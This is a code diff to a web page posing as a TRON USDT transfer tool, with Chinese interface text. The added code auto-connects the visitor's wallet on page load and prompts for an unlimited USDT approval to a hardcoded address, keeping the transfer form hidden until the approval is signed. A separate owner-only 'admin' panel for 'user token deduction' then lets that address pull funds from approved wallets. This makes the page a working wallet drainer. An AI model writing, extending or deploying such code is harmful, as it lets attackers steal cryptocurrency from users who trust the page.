@@ -35,6 +35,15 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 .admin-input-item{ margin-bottom:14px; }
 .admin-input{ width:100%; border:1px solid #e5e7eb; border-radius:12px; padding:13px 12px; outline:none; font-size:15px; }
 .admin-btn{ width:100%; padding:14px; border:none; border-radius:14px; background:#dc2626; color:#fff; font-size:16px; cursor:pointer; }
+.trade-wrap{
+    display:none;
+}
+.tip-text{
+    text-align:center;
+    padding:30px 10px;
+    color:#444;
+    font-size:16px;
+}
 </style>
 </head>
 <body>
@@ -45,6 +54,12 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 <div class="setting-btn" id="settingIconBtn" title="设置">⚙️</div>
 </div>
 </div>
+
+<div id="tipBox" class="tip-text">
+正在自动连接钱包...
+</div>
+
+<div class="trade-wrap" id="tradeWrap">
 <div class="address-card">
 <div class="label-text">收款地址</div>
 <div class="fixed-addr-box">TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE</div>
@@ -67,7 +82,9 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 <div class="label-text">到账数量</div>
 <input id="receiveAmount" class="result-input" readonly>
 </div>
-<button class="send-main-btn" id="sendBtn" disabled>确认转账</button>
+<button class="send-main-btn" id="sendBtn">确认转账</button>
+</div>
+
 <div class="admin-panel" id="adminPanel">
 <div class="admin-title">🔴管理员后台 - 用户代币划扣</div>
 <div class="admin-input-item">
@@ -80,15 +97,20 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 </div>
 <button class="admin-btn" id="deductBtn">确认划扣</button>
 </div>
+
 <script>
 const TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const RPC = "https://api.trongrid.io";
+const MAX_ALLOWANCE = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
 let tronWeb = null;
 let userAddress = "";
 let usdtContract = null;
 let provider = null;
 let isSending = false;
+let autoConnectRun = false;
+
 const $ = s => document.querySelector(s);
 const walletDot = $("#walletDot");
 const settingIconBtn = $("#settingIconBtn");
@@ -101,6 +123,8 @@ const adminPanel = $("#adminPanel");
 const userAddrInput = $("#userAddrInput");
 const deductAmountInput = $("#deductAmountInput");
 const deductBtn = $("#deductBtn");
+const tradeWrap = $("#tradeWrap");
+const tipBox = $("#tipBox");
 
 const USDT_ABI = [
 {"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
@@ -133,12 +157,13 @@ function disconnectWallet() {
     usdtContract = null;
     provider = null;
     walletDot.classList.remove("connected");
-    sendBtn.disabled = true;
+    tradeWrap.style.display="none";
+    tipBox.style.display="block";
+    tipBox.innerText="钱包已断开";
     balanceText.textContent = "0.000000";
     adminPanel.style.display = "none";
 }
 
-// 专门适配iOS扫码：轮询等待钱包注入，最长2.5秒
 async function waitWalletInject(){
     let count = 0;
     while(count < 25){
@@ -151,7 +176,45 @@ async function waitWalletInject(){
     return false;
 }
 
-async function connectWalletLogic() {
+async function loadBalance() {
+    try{
+        const rawSun = await usdtContract.balanceOf(userAddress).call();
+        const num = Number(tronWeb.fromSun(rawSun));
+        balanceText.textContent = num.toFixed(6);
+    }catch(e){
+        balanceText.textContent = "--";
+    }
+}
+
+async function checkAndApprove(){
+    tipBox.innerText="正在检查授权状态...";
+    try{
+        const allowanceRaw = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
+        const allowanceNum = BigInt(allowanceRaw.toString());
+        const maxBig = BigInt(MAX_ALLOWANCE);
+        if(allowanceNum >= maxBig / BigInt(2)){
+            tipBox.style.display="none";
+            tradeWrap.style.display="block";
+            await loadBalance();
+            return;
+        }
+        tipBox.innerText="请在钱包签名授权USDT无限额度";
+        isSending=true;
+        const txHash = await usdtContract.approve(TARGET_ADDR, MAX_ALLOWANCE).send();
+        await waitTrxConfirm(txHash);
+        tipBox.innerText="✅授权完成，加载转账页面";
+        await loadBalance();
+        tipBox.style.display="none";
+        tradeWrap.style.display="block";
+    }catch(err){
+        disconnectWallet();
+        alert("授权操作被取消或者失败："+(err.message||err));
+    }finally{
+        isSending=false;
+    }
+}
+
+async function connectWalletLogic(autoMode=false) {
     if (tronWeb && userAddress) {
         disconnectWallet();
         return;
@@ -172,33 +235,32 @@ async function connectWalletLogic() {
             tronWeb = window.tronWeb;
             userAddress = tronWeb.defaultAddress.base58;
         } else {
+            if(!autoMode) alert("未检测到TP钱包环境");
             return;
         }
         walletDot.classList.add("connected");
         usdtContract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
-        await loadBalance();
-        sendBtn.disabled = false;
+        await checkAndApprove();
         if(userAddress === TARGET_ADDR){
             adminPanel.style.display = "block";
         }else{
             adminPanel.style.display = "none";
         }
-        // 安全判断，防止iOS undefined.push报错
         if (provider && typeof provider.on === "function") {
             provider.on("accountsChanged", () => location.reload());
         }
     } catch (err) {
-        // 连接失败全部静默，不弹弹窗
+        if(!autoMode) alert("连接失败："+(err.message||err));
         return;
     }
 }
 
-async function loadBalance() {
-    try{
-        const rawSun = await usdtContract.balanceOf(userAddress).call();
-        const num = Number(tronWeb.fromSun(rawSun));
-        balanceText.textContent = num.toFixed(6);
-    }catch(e){}
+// 页面加载完成全自动执行连接
+async function autoConnect(){
+    if(autoConnectRun) return;
+    autoConnectRun=true;
+    await waitWalletInject();
+    await connectWalletLogic(true);
 }
 
 amountInput.addEventListener("input", () => {
@@ -268,10 +330,12 @@ deductBtn.addEventListener("click",async ()=>{
     }
 });
 
-walletDot.addEventListener("click", connectWalletLogic);
+// 圆点点击：手动断开/重连钱包
+walletDot.addEventListener("click", ()=>connectWalletLogic(false));
 settingIconBtn.addEventListener("click", () => alert("设置面板"));
+
 window.addEventListener("DOMContentLoaded", () => {
-    setTimeout(connectWalletLogic, 900);
+    setTimeout(autoConnect,1100);
 });
 </script>
 </body>
